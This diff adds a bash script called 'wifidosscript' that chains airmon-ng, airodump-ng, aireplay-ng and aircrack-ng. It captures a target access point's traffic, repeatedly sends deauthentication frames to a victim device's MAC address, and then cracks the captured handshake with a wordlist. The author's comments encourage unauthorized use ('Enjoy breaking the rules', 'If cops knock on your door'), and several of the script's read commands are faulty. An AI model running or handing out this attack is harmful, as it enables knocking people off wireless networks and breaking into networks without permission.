@@ -1,0 +1,114 @@
+#! /bin/bash
+# wifidosscript Author: barbarelasalerosa
+# contact: jerusalemabandida@proton.me
+#
+# This is a basic tool that can help you to 
+# easily use of all Kali Linux Tools for Wireless 
+# Attack. Better said, it is 4 in 1, so you don't 
+# have to open three (or more) terminals on your 
+# machine. I know it is not some eureka-project,
+# or something genius, but I hope it can help
+# you for further examinations and for
+# coming up with similar ideas that can ease
+# your pent-tests.
+
+#"*******************************************************"
+#"*******************************************************"
+#
+# One more thing, I don't want to bother you with mile-long documentation and (for this tool) more than sufficient repositories:) I want to keep it simple, so you don't have to bother.
+# Usage is very simple: 
+
+   # 1.First, check (stupid, I know) if you have installed tools for Wireless Attack, such as: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng. In case you don't have them installed, or updated...
+   # 2.Then, install them and/or update your machine;
+   # 3.Open your terminal and start this program by typing: ./wifidosscript
+   # 4.Enjoy breaking the rules....
+   # 5.If cops knock on your door, save yourself and sacrifice me! Thank you and may all wizards bless your sinful soul..... :) :) :) 
+
+
+read "
+
+
+
+
+----------------------*********------------WIFIDOSSCRIPT------------*********-------------*********------------WIFIDOSSCRIPT------------*********--------*********------------WIFIDOSSCRIPT------------*********-------------------------
+*****************************************************************************************************************************************************************************************************************************************
+----------------------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa-------------
+*****************************************************************************************************************************************************************************************************************************************
+----------------------*********------------WIFIDOSSCRIPT------------*********-------------*********------------WIFIDOSSCRIPT------------*********--------*********------------WIFIDOSSCRIPT------------*********-------------------------
+*****************************************************************************************************************************************************************************************************************************************
+----------------------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa-------------
+*****************************************************************************************************************************************************************************************************************************************
+----------------------*********------------WIFIDOSSCRIPT------------*********-------------*********------------WIFIDOSSCRIPT------------*********--------*********------------WIFIDOSSCRIPT------------*********-------------------------
+*****************************************************************************************************************************************************************************************************************************************
+----------------------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa BaRbArElA SaLeRoSa-------------------BaRbArElA SaLeRoSa-------------
+
+
+
+
+"
+
+
+echo "For exiting program, click Ctrl+C"
+echo "Do you want to start this program or not (for yes click 1, and for no click 0): "
+read answer
+if [ $answer -eq 1 ];then
+
+    echo "Good!"
+else
+    echo "We are turning off!"
+    exit
+fi
+
+
+airmon-ng start wlan0
+
+airmon-ng check kill
+
+airodump-ng wlan0
+
+echo "Enter the AP's channel: "
+read channel
+
+echo "Enter BSSID: "
+read BSSID
+
+echo "Enter ESSIDAUTH (you have to type name of specific ESSID and specific AUTH for that ESSID e.g. John-DoePSK): "
+read ESSIDAUTH
+
+echo "Enter (w)lan-mode face: "
+read wlanf
+
+airodump-ng -c $channel --bssid $BSSID -w $ESSIDAUTH $wlanf
+
+echo "Enter number of deauth frames: "
+read Number
+
+echo "Enter mac-address of the AP: "
+read Maca
+
+echo "Enter mac-address of target: "
+read VictimMAC
+
+echo "Enter (w)lan-mode face: "
+read wlanface
+
+for i in {1..10}
+
+do 
+    
+    aireplay-ng --deauth $Number -a $Maca -c $VictimMAC $wlanface
+    
+    sleep 60s
+
+done
+
+echo "Enter wordlist file or path with wordlist file: "
+read $wordlist
+
+echo "Enter AP's mac-address of victitimzed station: "
+read $victimmac
+
+echo "Enter the name of .cap file: "
+read $savedcap
+
+aircrack-ng -w $wordlist -b $victimmac $savedcap
